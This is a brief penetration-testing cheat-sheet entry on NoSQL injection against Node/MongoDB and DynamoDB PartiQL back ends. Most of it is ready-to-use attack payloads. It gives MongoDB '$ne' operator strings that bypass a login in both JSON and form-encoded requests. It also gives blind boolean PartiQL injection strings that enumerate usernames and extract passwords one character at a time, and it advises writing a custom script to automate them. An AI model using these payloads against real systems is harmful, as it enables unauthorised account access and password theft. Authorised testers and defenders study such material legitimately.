# NoSQL Injection

Auth bypass via Mongo operator injection — try this when SQLMap finds nothing on a Node/Mongo stack.

```bash
# JSON body
{"username":{"$ne":null},"password":{"$ne":null}}

# form-encoded (often the one that actually completes the login)
username=<USER>&password[$ne]=asdf
```

Blind boolean injection on query-style NoSQL (e.g. DynamoDB PartiQL) when there's no `$ne`-style operator — same binary-search idea as blind SQLi, just with the dialect's own boolean functions:

```bash
asdf' OR username > 'X ORDER BY username LIMIT 1 --                          # enumerate usernames
asdf' OR (username='<user>' AND begins_with(password,'<char>')) OR '1'='2 -- # extract one char at a time
```
sqlmap doesn't support PartiQL — a small custom script driving the same true/false oracle is usually needed.

